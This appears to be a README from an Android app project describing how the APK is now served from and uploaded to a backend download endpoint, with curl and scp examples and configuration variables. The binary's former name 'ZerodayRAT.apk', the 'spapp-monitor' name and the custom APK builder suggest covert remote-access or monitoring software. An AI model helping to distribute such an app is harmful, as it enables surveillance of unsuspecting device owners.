# APK distribution — no longer stored in this folder

The app binary is **not** part of the repository any more. Every build used to
drop an ~8 MB `ZerodayRAT.apk` here and commit it, which grew the git history
permanently and made clones slow.

The backend now streams the current build from disk:

```
GET  https://api2.nikaipro.com/api/download/apk        -> the APK
GET  https://api2.nikaipro.com/api/download/apk/info   -> { versionName, versionCode, sizeBytes, sha256, updatedAt }
POST https://api2.nikaipro.com/api/download/apk        -> upload a new build (super-admin JWT)
```

`ConnectPage.tsx`, the device share link, the PDF export button and the custom
APK builder all resolve to `/api/download/apk` via `src/api/apk.ts`, so the URL
never changes between builds.

## Publishing a build

`./gradlew assembleDebug` (or `assembleRelease`) runs the `publishApk` task,
which copies the APK to `backend/storage/apk/spapp-monitor.apk`, writes a
sidecar `spapp-monitor.json` with version + SHA-256, and prints the exact
deploy command. On a server deployment, push the file over HTTPS:

```bash
curl -X POST 'https://api2.nikaipro.com/api/download/apk?versionName=1.5.0&versionCode=49' \
  -H "Authorization: Bearer $SUPER_ADMIN_JWT" \
  -H 'Content-Type: application/octet-stream' \
  --data-binary '@backend/storage/apk/spapp-monitor.apk'
```

Or copy it into place directly on the server:

```bash
scp backend/storage/apk/spapp-monitor.apk <server>:/path/to/backend/storage/apk/
```

Both `backend/storage/` and this folder's `*.apk` are git-ignored.

## Configuration

| Variable | Default | Purpose |
|---|---|---|
| `APK_STORAGE_DIR` | `backend/storage/apk` | Where the served APK lives |
| `APK_FILENAME` | `spapp-monitor.apk` | File name inside that directory |
| `APK_MAX_UPLOAD` | `200mb` | Upload size ceiling |
